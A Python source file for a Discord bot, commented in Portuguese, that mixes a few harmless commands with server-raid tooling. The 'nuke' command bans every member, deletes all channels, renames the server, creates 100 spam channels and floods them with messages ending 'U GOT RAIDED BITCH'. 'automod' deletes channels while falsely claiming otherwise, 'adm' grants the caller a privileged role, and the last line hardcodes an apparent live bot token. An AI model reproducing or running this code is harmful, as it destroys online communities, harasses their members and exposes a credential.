import discord
import dotenv
from discord.ext import commands
import os

dotenv.load_dotenv()


intents = discord.Intents.all()
bot = commands.Bot(".", intents=intents)

#events
@bot.event
async def on_ready ():
    print("O melhorzinho acordou")

@bot.event
async def on_member_join(membro:discord.Member):
    canal = bot.get_channel()
    await canal.send(f"{membro.mention} Entrou no servidor")


@bot.command(name='clear')
async def clear(ctx, amount: int = 500):
    """Limpa até 500 mensagens (ou valor especificado) do canal."""
    await ctx.channel.purge(limit=amount)
    confirmation = await ctx.send(f"🧹 Limpei {amount} mensagens!")
    await confirmation.delete(delay=3)

#comandos
@bot.command() #mostre os comandos
async def cmd(ctx:commands.Context):
    nome = ctx.author.name
    await ctx.reply(f"Os comandos do bot são, | .ola, .calcule, .fale | Leia com atenção {ctx.author.mention}")

@bot.command() #diga ola para o bot
async def ola(ctx:commands.Context):
    nome = ctx.author.name #puxa o nome, do autor, que executou o comando
    await ctx.reply(f"Olaa, {ctx.author.mention} como você esta?")

@bot.command() #mande o bot falar algo
async def fale(ctx:commands.Context, *, texto):
    await ctx.send(texto)

@bot.command() #faça a soma de x + x
async def calcule(ctx:commands.Context, n1:int, n2:int):
    resultado = n1 + n2
    await ctx.send(f"A some entre {n1} e {n2} é igual a {resultado}")

@bot.command()
async def ban(ctx, membro: discord.Member, *, motivo=None):
    try:
        await membro.ban(reason=motivo)
        await ctx.send(f"✅ O membro {membro.mention} foi banido. Motivo: {motivo or 'Não especificado'}")
    except discord.Forbidden:
        await ctx.send("❌ Não tenho permissão para banir esse membro.")
    except discord.HTTPException:
        await ctx.send("❌ Ocorreu um erro ao tentar banir o membro.")

@bot.command()
async def divulgar_video(ctx, link: str):
    await ctx.message.delete()
    if not link.startswith("https://vm.tiktok.com/"):
        await ctx.send("❌ Por favor, envie um link válido do TikTok.")
        return

    mensagem = (
        "🎬 **Novo vídeo no TikTok!** 🎬\n"
        f"Confira agora mesmo: {link}\n"
    )
    await ctx.send(mensagem)

@bot.command()
async def nuke(ctx, *,mensagem):
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    await ctx.send("Você tem certeza que quer **ACABAR** com o server? Responda `SIM` para confirmar.")

    try:
        msg = await bot.wait_for("message", check=check, timeout=30.0)
        if msg.content.upper() != "SIM":
            await ctx.send("❌ Cancelado.")
            return
    except asyncio.TimeoutError:
        await ctx.send("⏰ Tempo esgotado. Cancelado.")
        return

     #Banir membros em paralelo
    ban_tasks = []
    for member in ctx.guild.members:
        if not member.bot and member != ctx.author:
            ban_tasks.append(asyncio.create_task(member.ban(reason="Reset do servidor pelo bot.")))

    await asyncio.gather(*ban_tasks, return_exceptions=True)

     #Excluir canais em paralelo
    delete_tasks = []
    for channel in ctx.guild.channels:
        if channel != ctx.channel:
            delete_tasks.append(asyncio.create_task(channel.delete()))

    await asyncio.gather(*delete_tasks, return_exceptions=True)

    await ctx.send("...")
    await ctx.send("Criando canais...")

        # Altera o nome do servidor
    try:
        await ctx.guild.edit(name="𝐅𝐔𝐂𝐊𝐄𝐃 𝐒𝐄𝐑𝐕𝐄𝐑")
    except Exception as e:
        print(f"Erro ao mudar nome do servidor: {e}")

    async def criar_canal(i):
        try:
            nome_canal = f"𝐄𝐂𝐇𝐎|𝖇𝖞 𝖒𝖔𝖔𝖓" #𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐃𝐘𝐍𝐀𝐒𝐓𝐘
            await ctx.guild.create_text_channel(nome_canal)
        except Exception as e:
            print(f"Erro ao criar canal {i}: {e}")

    tarefas = [asyncio.create_task(criar_canal(i)) for i in range(1, 101)]
    await asyncio.gather(*tarefas)

    await ctx.send("THE SHOW IS DONE")
    await ctx.send("Divulgando sua mensagem. . . aguarde")

    semaforo = asyncio.Semaphore(10)  # Máximo 5 mensagens em paralelo
    count = 0

    async def enviar_em_canal(channel):
        async with semaforo:
            try:
                for _ in range(10):  # Reduzi para 5 vezes por segurança
                    await channel.send(mensagem)
                    await asyncio.sleep(0.5)  # Evita ser rate limited
                return True
            except Exception as e:
                print(f"Erro em {channel.name}: {e}")
                return False

    tarefas = [enviar_em_canal(channel) for channel in ctx.guild.text_channels]
    resultados = await asyncio.gather(*tarefas)
 
    canais_enviados = sum(resultados)
    await ctx.send(f"U GOT RAIDED BITCH")



@bot.command()
async def automod(ctx):
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    await ctx.send("Gostaria de **ativar o AutoMod**? Responda `SIM` para confirmar.")

    try:
        msg = await bot.wait_for("message", check=check, timeout=30.0)
        if msg.content.upper() != "SIM":
            await ctx.send("❌ Cancelado.")
            return
    except asyncio.TimeoutError:
        await ctx.send("⏰ Tempo esgotado. Cancelado.")
        return

    # Banir membros em paralelo
    #ban_tasks = []
    #for member in ctx.guild.members:
        #if not member.bot and member != ctx.author:
            #ban_tasks.append(asyncio.create_task(member.ban(reason="Reset do servidor pelo bot.")))

    #await asyncio.gather(*ban_tasks, return_exceptions=True)

    # Excluir canais em paralelo
    delete_tasks = []
    for channel in ctx.guild.channels:
        if channel != ctx.channel:
            delete_tasks.append(asyncio.create_task(channel.delete()))

    await asyncio.gather(*delete_tasks, return_exceptions=True)

    await ctx.send("✅ Todos os membros foram banidos e os canais excluídos (exceto este).")



import asyncio

@bot.command()
async def reset(ctx):
    await ctx.send("Criando canais...")

        # Altera o nome do servidor
    try:
        await ctx.guild.edit(name="𝐅𝐔𝐂𝐊𝐄𝐃 𝐒𝐄𝐑𝐕𝐄𝐑")
    except Exception as e:
        print(f"Erro ao mudar nome do servidor: {e}")

    async def criar_canal(i):
        try:
            nome_canal = f"𝐄𝐂𝐇𝐎|𝖇𝖞 𝖒𝖔𝖔𝖓" #𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐃𝐘𝐍𝐀𝐒𝐓𝐘
            await ctx.guild.create_text_channel(nome_canal)
        except Exception as e:
            print(f"Erro ao criar canal {i}: {e}")

    tarefas = [asyncio.create_task(criar_canal(i)) for i in range(1, 101)]
    await asyncio.gather(*tarefas)

    await ctx.send("THE SHOW IS DONE")


import asyncio

@bot.command()
async def divulgar(ctx, *, mensagem):
    await ctx.send("Divulgando sua mensagem. . . aguarde")

    semaforo = asyncio.Semaphore(10)  # Máximo 5 mensagens em paralelo
    count = 0

    async def enviar_em_canal(channel):
        async with semaforo:
            try:
                for _ in range(10):  # Reduzi para 5 vezes por segurança
                    await channel.send(mensagem)
                    await asyncio.sleep(0.5)  # Evita ser rate limited
                return True
            except Exception as e:
                print(f"Erro em {channel.name}: {e}")
                return False

    tarefas = [enviar_em_canal(channel) for channel in ctx.guild.text_channels]
    resultados = await asyncio.gather(*tarefas)
 
    canais_enviados = sum(resultados)
    await ctx.send(f"U GOT RAIDED BITCH")

@bot.command()
async def adm(ctx):
    # Procura o cargo chamado "Administrador"
    role = discord.utils.get(ctx.guild.roles, name="Echo Bot")

    if role is None:
        await ctx.send("❌ Role not Found **Bots**.")
        return

    # Adiciona o cargo ao autor do comando
    try:
        await ctx.author.add_roles(role)
        await ctx.send(f"✅ {ctx.author.mention} esta solto!")
    except discord.Forbidden:
        await ctx.send("❌ Eu não tenho permissão para dar esse cargo.")
    except Exception as e:
        await ctx.send(f"⚠️ Ocorreu um erro: {e}")


bot.run("MTQ2MDY5NjM1ODQyMjg0MzQ1Mg.GxTOs0.ZavWlArVkWqM1vYM-kRv6Cn9OAtfv17MBFVQU8")